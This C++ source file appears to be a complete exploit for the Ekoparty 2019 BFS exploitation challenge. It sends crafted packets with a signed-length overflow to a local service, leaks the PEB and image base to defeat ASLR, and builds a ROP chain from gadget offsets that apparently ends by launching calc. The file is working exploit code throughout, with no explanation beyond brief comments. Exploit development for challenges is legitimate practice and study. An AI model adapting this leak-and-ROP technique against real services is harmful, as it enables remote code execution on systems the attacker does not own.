/****************************************************************************
*                                                                           *
* Eko.cpp -- Exploiting BFS Ekoparty 2019 Exploitation Challenge            *
*                                                                           *
* Copyright (c) Skylake.                                                    *
*                                                                           *
****************************************************************************/

#pragma once

#include <stdio.h>
#include <winsock2.h>
#include <tchar.h>

#pragma comment (lib, "Ws2_32.lib")

typedef struct _EKO_COMM_HDR // Eko Common Header
{
	CHAR szEkoSig[8];
	INT  BufferLen; // Type doesn't matter
	BYTE Resrvd[4];
} EKO_COMM_HDR, * PEKO_COMM_HDR;

BOOL WINAPI LeakEko( struct sockaddr *sa, PEKO_COMM_HDR Eko, PULONG64 SendBuffer, PULONG64 LeidenJar )
{
	SOCKET s = NULL;
	BOOL Status = FALSE;
	__try {
		//
		s = socket( AF_INET, SOCK_STREAM, IPPROTO_TCP );
		if( s == INVALID_SOCKET ) __leave;

		if( connect( s, sa, sizeof( struct sockaddr_in ) ) ) __leave;

		if( send( s, ( CHAR * ) Eko, 16, 0 ) < 0 ) __leave;
		if( send( s, ( CHAR * ) SendBuffer, 0x210, 0 ) < 0 ) __leave;
		if( !LeidenJar ) __leave;
		Status = ( recv( s, ( CHAR * ) LeidenJar, 8, 0 ) == 8 );
	}

	__finally {
		if( s ) closesocket( s );
	}

	return Status;
}

int _tmain(int argc, _TCHAR* argv[])
{
	WSADATA wsaData = { 0 };
	struct sockaddr_in sa = { 0 };
	EKO_COMM_HDR Eko = { 0 };
	ULONGLONG Buffer [0x42] = { 0 }, peb, ImageBase;

	__try {
		//
		if( WSAStartup( MAKEWORD(2,2), &wsaData ) ) __leave;
		sa.sin_family = AF_INET;
		sa.sin_port = htons( 54321 );
		// Use InetPton + replace the localhost address with argv [1] if necessary
		sa.sin_addr.S_un.S_addr = inet_addr( "127.0.0.1" );

		strcpy_s( Eko.szEkoSig, "Eko2019" );
		Eko.BufferLen = 0x80000210; // We only need the Sign bit and 16 EXTRA bytes.

		Buffer [0x40] = 0x65;
		Buffer [0x41] = 0x60;

		if( !LeakEko( ( struct sockaddr * ) &sa, &Eko, ( PULONG64 ) &Buffer, &peb ) ) __leave;

		// Switching back to normal "mov rax, [rcx]"
		Buffer [0x40] = 0x90; // NOP - There are many other opcodes
		Buffer [0x41] = peb + 0x10;

		if( !LeakEko( ( struct sockaddr * ) &sa, &Eko, ( PULONG64 ) &Buffer, &ImageBase ) ) __leave;

		Buffer [0x40] = 0x51;
		Buffer [0x41] = ImageBase + 0x158B;

		Buffer [0x02] = ImageBase + 0x50B6;
		//
		Buffer [0x0B] = ImageBase + 0x9010;
		Buffer [0x0C] = ImageBase + 0x1167;

		Buffer [0x0D] = 0x13FF2C0C8D489257;

		Buffer [0x0E] = ImageBase + 0x85FD;
		Buffer [0x19] = 0xD0;
		Buffer [0x1A] = ImageBase + 0x198D;
		Buffer [0x21] = ImageBase + 0x1AEA;
		Buffer [0x22] = ImageBase + 0x1992;
		Buffer [0x23] = ImageBase + 0x1387;
		Buffer [0x34] = ImageBase + 0x2E40;
		Buffer [0x3B] = ImageBase + 0x1164;
		Buffer [0x3C] = 0x636C6163;

		LeakEko( ( struct sockaddr * ) &sa, &Eko, ( PULONG64 ) &Buffer, NULL );
	}

	__finally {
		WSACleanup();
	}
	return 0;
}

